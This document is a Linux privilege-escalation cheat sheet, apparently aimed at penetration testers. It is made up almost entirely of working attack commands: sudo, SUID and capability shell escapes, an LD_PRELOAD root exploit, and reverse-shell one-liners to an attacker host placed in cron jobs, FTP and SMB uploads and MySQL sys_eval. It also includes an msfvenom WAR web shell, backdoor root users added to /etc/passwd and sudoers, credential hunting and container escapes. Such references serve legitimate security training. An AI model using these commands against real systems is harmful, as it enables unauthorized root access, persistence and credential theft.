# Privilege Escalation Information Gathering

#### Current User and Permissions
- `whoami`: Display the current user.
- `id`: Shows the current user's UID, GID, and group memberships.
- `sudo -l`: Lists commands that the current user can run as root or with elevated privileges without a password.
- `getent passwd`: Lists all users on the system.
- `getent passwd <username>`: Displays detailed information about a specific user.

#### Group Enumeration
- `groups`: Displays groups the current user belongs to.
- `getent group <groupname>`: Lists members of a specific group.
- `getent group root`: Lists members of the root group.
- `getent group sudo`: Lists members of the sudo group.

#### Kernel Information
- `uname -a`: Displays the system kernel version and architecture.
- `cat /proc/version`: Displays kernel version, GCC version, and other system information.
- `cat /proc/cpuinfo`: Displays CPU architecture, which might help in identifying exploitability of certain binaries or kernel exploits.
- `cat /etc/os-release`: Displays OS information.
- `lsb_release -a`: Displays distribution information
- `dmesg | grep -i 'kernel'`: Review kernel messages for possible indications of vulnerabilities.
- `sysctl -a | grep 'kernel\.randomize_va_space'`: Check if address space layout randomization (ASLR) is enabled, which might affect some kernel exploits.

#### Environment Variables
- `printenv`: Display all environment variables. Misconfigured variables could lead to privilege escalation (e.g., `LD_PRELOAD`, `PATH`).
- `echo $PATH`: Ensure the system uses secure paths. Malicious binaries placed in the path can lead to privilege escalation.

# Sudo Privilege Escalation

- **[GTFO Bins](https://gtfobins.github.io/)**

#### Exploiting `sudo`
- **List `sudo` Commands Current User Can Execute:**
	```bash
	sudo -l
	```
- **Execute any allowed command with elevated privileges:**
	```bash
	sudo <command>
	```

- **List `sudo` Commands That Can Execute Without Password (`NOPASSWD`):** These commands can be executed as root without requiring a password.
```bash
sudo -u root /bin/bash
```

#### Abuse `sudo` to Run a Shell
- **Abuse `sudo` to Run a Shell:**
	```bash
	sudo bash
	sudo -i
	```

#### Exploiting Misconfigured Sudo
- **Use commands such as `vi`, `less`, or `nano` to edit critical system files like `/etc/shadow` or `/etc/sudoers`:**
	```bash
	sudo <command> <file>
	```

#### Insecure Binary Execution via `sudo`
- **Privilege Escalation via `sudo` with Insecure Binary Execution:**
	```bash
	sudo find / -exec /bin/sh \;
	sudo vim -c '!sh'
	sudo less /etc/hosts (press !sh)
	```

#### Exploiting Binary Overwriting via Sudo
- **Overwrite a binary or script with a writable path, replace the binary with a malicious one:**
	```bash
	echo "/bin/sh" > /tmp/vulnerable.sh
	```
- **Gain a root shell:**
	```bash
	sudo /tmp/vulnerable.sh
	```

#### Exploiting Special `sudo` Configurations
- **Exploit `sudo` with `!` in Command Arguments:**
	```bash
	sudo -u#-1 /bin/bash
	```
- **Exploit `sudo `to Run a File Editor with Root Privileges:**
	```bash
	sudo EDITOR=nano crontab -e
	```
- **Exploit `sudo` by Specifying an Arbitrary User:**
	```bash
	sudo -u user /bin/bash
	```

#### Abusing `sudo` with Limited Commands
- **Escalate Privileges via Restricted Commands:**
	```bash
	sudo awk 'BEGIN {system("/bin/sh")}'
	sudo find / -exec /bin/sh \;
	sudo perl -e 'exec "/bin/sh";'
	```

#### Exploiting `LD_PRELOAD`
- **Abuse `LD_PRELOAD` with `sudo`** : Forces the program to run the`.so` file as root.
	```bash
	echo 'int main() { setuid(0); system("/bin/sh"); }' > /tmp/exploit.c
	gcc -o /tmp/exploit.so -shared -fPIC /tmp/exploit.c
	sudo LD_PRELOAD=/tmp/exploit.so <command>
	```

# SUID and SGID Binaries

SUID/SGID binaries execute with the privileges of the file's owner (usually root), making them prime targets for exploitation.

- **[GTFO Bins](https://gtfobins.github.io/)**

#### Finding SUID/SGID Binaries
- **Lists all SUID binaries:** Executed with the owner's privileges, often root.
	```bash
	find / -perm /4000 2>/dev/null
	```
- **Lists all SGID binaries:** Executed with the group’s privileges.
	```bash
	find / -perm /2000 2>/dev/null
	```

#### Find SUID Binaries Owned by Root
- **Find SUID Binaries Owned by Root:**
	```bash
	find / -user root -perm -4000 -exec ls -ldb {} \;
	```

#### Writable SUID Binaries
- **Finds SUID binaries writable by others:**
	```bash
	find / -perm -4007 2>/dev/null
	```

#### Analyzing SUID/SGID Binaries
- **Verify if the binary has SUID/SGID bit set:** 
	```bash
	ls -l /path/to/binary
	```
- **Inspect binaries for hardcoded paths, credentials, or function calls that can be exploited:**
	```bash
	strings /path/to/binary
	```

#### Common SUID Binaries
- **Exploit SUID `bash`:**
	```bash
	./bash -p
	```
- **Exploit SUID `find`:**
	```bash
	find . -exec /bin/sh -p \; -quit
	```
- **Exploit SUID `vim`:**
	```bash
	vim -c ':!sh'
	```
- **Exploit SUID `nmap`:**
	```bash
	nmap --interactive
	!sh
	```
- **Exploit SUID `awk`:**
	```bash
	awk 'BEGIN {system("/bin/sh")}'
	```
- **Exploit SUID `perl`:**
	```bash
	perl -e 'exec "/bin/sh";'
	```
- **Exploit SUID `python`:**
	```bash
	python -c 'import os; os.system("/bin/sh")'
	```

#### Exploiting Custom or Uncommon SUID Programs
- **Examine Custom SUID Binaries for Vulnerabilities:**
	```bash
	strings /path/to/suid_binary
	ltrace /path/to/suid_binary
	strace /path/to/suid_binary
	```

# Cron Jobs Privilege Escalation

#### User Cron Jobs
- **Lists cron jobs for the current user:**
	```bash
	crontab -l
	```
- **Check for User Cron Jobs:**
	```bash
	ls -la /var/spool/cron/crontabs/
	```

#### System-Wide Cron Jobs
- **Lists system-wide cron jobs and cron job directories:**
	```bash
	ls -la /etc/cron*
	```
- **Displays the system-wide crontab file:**
	```bash
	cat /etc/crontab
	```
- **Displays all files in /etc/cron.d:**
	```bash
	cat /etc/cron.d/*
	```

#### Writable Cron Jobs
- **Lists writable Cron Job files:**
	```bash
	find /etc/cron* -writable -type f 2>/dev/null
	```

#### Misconfigured or Writable Cron Jobs
- **Writable Cron Job Directories:** Insert malicious cron jobs that run as root.
  ```bash
  echo "* * * * * root bash -i >& /dev/tcp/<attack_ip>/<port> 0>&1" > /etc/cron.d/root_job
  ```
- **Exploit Misconfigured Cron Jobs:** If the user has write permissions on any cron job files, modify them to execute malicious commands:
	```bash
	echo "bash -i >& /dev/tcp/<attack_ip>/<port> 0>&1" > /path/to/writable/cronjob
	```
- **Exploit Executable Writable Script:** If the cron job executes a script with weak permissions, replace the script with malicious commands.
	```bash
	echo "/bin/sh" > /path/to/cron/script.sh
	```

#### Exploiting Cron Jobs with Wildcards
- **Abuse Wildcards in a Cron Job:**
	```bash
	echo 'echo "bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1" > /tmp/shell.sh' > /tmp/--checkpoint-action=exec=sh /tmp/--checkpoint=1
	```

	```bash
	echo "bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1" > /tmp/shell.sh
	touch /tmp/--checkpoint=1
	touch /tmp/--checkpoint-action=exec=sh /tmp/shell.sh
	```

#### Cron Log Injection
- **Add a malicious cron job directly by modifying the cron log:**
	```bash
	echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/<attack_ip>/<port> 0>&1'" >> /var/spool/cron/root
	```

#### Abusing World-Writable Cron Directories
- **Abusing `/var/spool/cron`:** Add cron jobs directly to the spool.
  ```bash
  echo "* * * * * root /bin/bash -i >& /dev/tcp/<attack_ip>/<port> 0>&1" >> /var/spool/cron/root
  ```

#### Time-Based Cron Exploits
- **Race Condition Exploit:** If cron jobs create temporary files with weak permissions, a race condition exploit could replace those files before execution.
    ```bash
    while true; do
      ln -sf /tmp/malicious_script /tmp/vulnerable_tempfile
    done
    ```

# System Capabilities

Linux file capabilities allow a program to have privileges without needing to be setuid-root. Misconfigured capabilities can lead to privilege escalation.

- **[GTFO Bins](https://gtfobins.github.io/)**

#### Finding Files with Capabilities
- **List All Files with Special Capabilities Set:**
	```bash
	getcap -r / 2>/dev/null
	```
- **Exploit `cap_setuid+ep` on a Binary:**
	```bash
	./binary id
	```
- **Exploit Capabilities on Python:**
	```bash
	python -c 'import os; os.setuid(0); os.system("/bin/sh")'
	```

#### Manipulating Capabilities
- **Add Capabilities to a Binary:**
	```bash
	setcap cap_setuid+ep /path/to/binary
	```

#### Exploiting Misconfigured Capabilities
- **`/usr/bin/python2.7`:** Allows setting UID, making privilege escalation possible.
	```bash
	/usr/bin/python2.7 = cap_setuid+ep
	python2 -c 'import os; os.setuid(0); os.system("/bin/sh")'
	```
- **`/usr/bin/perl`:** Similar to Python; allows UID switching.
	```bash
	/usr/bin/perl = cap_setuid+ep
	perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/sh";'
	```
- **`/usr/bin/env`:** Allows binding to privileged ports, which could lead to unintended behaviors.
	```bash
	/usr/bin/env = cap_net_bind_service+ep
	```

# Environmental Variables

#### Environment Variables
- **List Current Environment Variables:**
	```bash
	env
	```
- **Prints all environment variables:**
	```bash
	printenv
	```
- **Displays the PATH variable:**
	```bash
	echo $PATH
	```

#### Writable Directories in PATH
- **Lists writable directories in PATH:**
	```bash
	find $(echo $PATH | tr ':' ' ') -type d -writable 2>/dev/null
	```
- **Or:**
	```bash
	echo $PATH | tr ":" "\n" | xargs -I {} find {} -writable -type d 2>/dev/null
	```

#### PATH Hijacking
- **Overwrite `PATH` Binaries:** If you can control the `PATH` environment variable, place a malicious binary with the same name as a system binary in the current directory.
	```bash
	echo '/bin/sh' > /tmp/ls
	chmod +x /tmp/ls
	export PATH=/tmp:$PATH
	```

# File Permissions and Ownership

- **[GTFO Bins](https://gtfobins.github.io/)**

#### Search for World-Writable Files
- **Find All World-Writable Files:** May allow modification or trojanization.
	```bash
	find / -writable -type f 2>/dev/null
	```
- **Find All World-Writable Directories,:** May allow dropping malicious files or binaries.
	```bash
	find / -writable -type d 2>/dev/null
	```
- **Find All World-Writable Files and Directories:**
	```bash
	find / -perm -o+w -exec ls -ld {} \; 2>/dev/null
	```
- **Find All Directories with Group or World-Writable Permissions:** If critical system directories like `/etc`, `/home`, or `/var` are writable, they can be exploited.
	```bash
	find / -perm -g+w -o -perm -o+w -type d 2>/dev/null
	```
- **Find All Writable System Binaries:**
	```bash
	find /bin /sbin /usr/bin /usr/sbin /usr/local/bin -writable -type f 2>/dev/null
	```

#### Insecure File Ownership
- **Identify non-root-owned SUID binaries:** This may be an indication of misconfiguration
	```bash
	find / -not -user root -perm /4000 2>/dev/null
	```
- **Find SGID binaries that can be exploited based on group membership:**
	```bash
	find / -group <group> -perm /2000 2>/dev/null
	```

#### Important Configuration Files
- **Check permissions of passwd file:**
	```bash
	ls -la /etc/passwd
	```
- **Check permissions of shadow file:**
	```bash
	ls -la /etc/shadow
	```

#### Writable `/etc/passwd`
- **Add a New Root User by Modifying `/etc/passwd`:**
	```bash
	echo 'newuser:x:0:0::/root:/bin/bash' >> /etc/passwd
	su newuser
	```

#### Writable `/etc/shadow`
- **Generate a new password hash:**
    ```bash
    openssl passwd -1 -salt root newpassword
    ```
- **Replace the root hash in `/etc/shadow` with the new hash:**
    ```bash
    sed -i 's|root:.*|root:<new_hash>:18030:0:99999:7:::|' /etc/shadow
    ```

#### Writable `/etc/sudoers`
- **Grant sudo Privileges to a User:**
	```bash
	echo 'username ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
	```

#### Writable `/sshd_config`
- **Enable Root Long:**
```bash
 echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
 service ssh restart
```
- **Enable Password-base Authentication:**
```bash
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
service ssh restart
```

# Configuration Files and Sensitive Information

#### SSH Keys and Configurations
- **Lists authorized SSH keys for the current user:**
	```bash
	cat ~/.ssh/authorized_keys
	```
- **Displays SSH daemon configuration:**
	```bash
	cat /etc/ssh/sshd_config
	```

#### Configuration Files
- **Finds all configuration files:**
	```bash
	find / -name "*.conf" 2>/dev/null
	```

#### Database Configuration Files
- **Example of checking for database credentials in web config files:**
	```bash
	cat /var/www/html/config.php
	```
- **Finds configuration files with 'config' in the name:**
	```bash
	find / -name "*config*" -type f 2>/dev/null
	```

#### Searching for Sensitive Information
- **Find Files Containing Passwords:**
	```bash
	grep -i "password" /etc/passwd /etc/shadow /etc/securetty /home/* /root/* /var/* 2>/dev/null
	```
- **Search for SSH Keys:**
	```bash
	find / -name authorized_keys 2>/dev/null
	find / -name id_rsa 2>/dev/null
	```
- **Look for Configuration Files with Credentials:**
	```bash
	grep -r -i "password" /var/www/ /etc/ 2>/dev/null
	```

# Kernel Exploits

#### Exploiting Kernel Vulnerabilities
- **Search for Available Kernel Exploits:**
	```bash
	searchsploit linux kernel <version>
	```
- **Compile and Run a Public Kernel Exploit:**
	```bash
	gcc -o exploit exploit.c
	./exploit
	```

#### Loaded Kernel Modules
- **Lists all loaded kernel modules:**
	```bash
	lsmod
	```
- **Displays information about a specific module:**
	```bash
	modinfo <module_name>
	```

#### Hardware Information
- **Lists detailed information about hardware:**
	```bash
	lshw
	```
- **Lists all PCI devices:**
	```bash
	lspci
	```
- **Lists all USB devices:**
	```bash
	lsusb
	```

#### Firmware-Level Exploitation
- **Check for Writable Firmware Files:**
	```bash
	find /boot /lib/firmware /usr/lib/firmware -writable 2>/dev/null
	```

# Security Configurations and Auditing

#### Audit Logs
- **Displays authentication logs (Debian-based):**
	```bash
	cat /var/log/auth.log
	```
- **Displays authentication logs (RHEL-based):**
	```bash
	cat /var/log/secure
	```
- **Displays last login of all users:**
	```bash
	lastlog
	```

# Network Services and Configurations

#### Listening Services
- **Lists all listening services:**
	```bash
	netstat -tuln
	```
- **Another method to list listening services:**
	```bash
	ss -tuln
	```

#### Enumerate Running Services
- **Enumerate Running Services:**
	```bash
	ps aux | grep -i "service_name"
	```

#### Services Running as Root
- **Lists processes running as root:**
	```bash
	ps aux | grep root
	```

#### Network Configuration Files
- **Displays `xinetd` service configuration:**
	```bash
	cat /etc/xinetd.conf
	```
- **Displays detailed `xinetd` service configurations:**
	```bash
	cat /etc/xinetd.d/*
	```

#### Exploiting Misconfigured FTP
- **Check for Anonymous FTP Login:**
	```bash
	ftp <target_ip>
	```
- **Exploit FTP Write Access:**
	```bash
	echo "bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1" > shell.sh
	ftp <target_ip>
	put shell.sh
	```

#### Exploiting SMB (Samba) Shares
- **Mount a Writable SMB Share:**
	```bash
	smbclient //target/share -U user
	mount -t cifs //target/share /mnt -o username=user,password=pass
	```
- **Exploit Writable SMB Share to Upload Malicious Files:**
	```bash
	echo 'bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1' > /mnt/shell.sh
	```

#### Exploiting NFS 
- If `no_root_squash` is not enabled, create files as root in the mounted share:
- **List NFS Shares:**
	```bash
	showmount -e <target_ip>
	```
- **Create a New Root User on NFS Share by Overwriting `/etc/passwd`:**
	```bash
	echo 'newuser:x:0:0::/root:/bin/bash' >> /mnt/etc/passwd
	```
- **Mount the NFS Share:**
	```bash
	mount -t nfs <target_ip>:/nfs/share /mnt
	```
- **Set the SUID bit on `/bin/bash`, giving root privileges when executed:**
	```bash
	cp /bin/bash /mnt/bash; chmod +s /mnt/bash
	```

#### MySQL Root Access
- **Execute shell commands via SQL injection or weak configurations:** If the MySQL service is misconfigured and running as root, exploit it to write to critical files.
	```sql
	SELECT sys_eval('bash -i >& /dev/tcp/<attack_ip>/<port> 0>&1')
	```
- **MySQL Running as Root:** If MySQL runs as root, use UDF (User Defined Functions) to execute commands as root:
  ```bash
  use mysql;
  create table foo(line blob);
  insert into foo values(load_file('/etc/shadow'));
  ```
- **Leveraging `sys_eval()`:** Use `sys_eval()` to run commands directly from MySQL:
  ```bash
  select sys_eval('bash -i >& /dev/tcp/<attack_ip>/<port> 0>&1');
  ```

#### Apache Tomcat Misconfigurations
- **Deploying a WAR File (Web Shell):** If you have access to the Tomcat Manager interface, upload a malicious WAR file to gain a shell:
  ```bash
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attack_ip> LPORT=<port> -f war > shell.war
  curl --user tomcat:tomcat 'http://<target_ip>:8080/manager/text/deploy?path=/shell&war=file:/path/to/shell.war'
  curl 'http://<target_ip>:8080/shell/'
  ```

# Containers and Virtualization

#### Virtualization Enumeration
- **Detects if the system is running in a virtualized environment:**
	```bash
	systemd-detect-virt
	```

#### Docker Enumeration
- **Lists all Docker containers:**
	```bash
	docker ps -a
	```
- **Lists all Docker images:**
	```bash
	docker images
	```
- **Displays Docker daemon configuration:**
	```bash
	cat /etc/docker/daemon.json
	```

#### Docker Privilege Escalation
- **Escalate Privileges via Docker (if User is in the docker Group):**
	```bash
	docker run -v /:/mnt --rm -it alpine chroot /mnt sh
	```

#### Escaping Docker Containers
- **Escape a Docker Container (if `docker` Group is Misconfigured):**
	```bash
	docker run -v /:/mnt --rm -it alpine chroot /mnt sh
	```
- **Escape a Docker Container Using Mount Namespace:**
	```bash
	docker run -it --rm --cap-add=SYS_ADMIN --security-opt=apparmor=unconfined ubuntu bash
	mount -t proc proc /proc
	nsenter --target 1 --mount --uts --ipc --net --pid
	```

#### LXC/LXD Enumeration
- **Lists all LXC containers:**
	```bash
	lxc list
	```
- **Displays information about LXC containers:**
	```bash
	lxc info
	```

####  Escaping LXC Containers
- **Escape from an LXC Container:**
	```bash
	lxc-attach -n <container> /bin/sh
	```